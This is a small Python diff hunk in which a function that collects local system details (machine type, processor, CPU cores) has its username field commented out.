@@ -69,7 +69,7 @@ def execute_command(command):
             'Machine': platform.machine(),
             'Processor': platform.processor(),
             'CPU Cores': os.cpu_count(),
-            'Username': os.getlogin(),
+            #'Username': os.getlogin(),
         }
         info_string = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
         return info_string
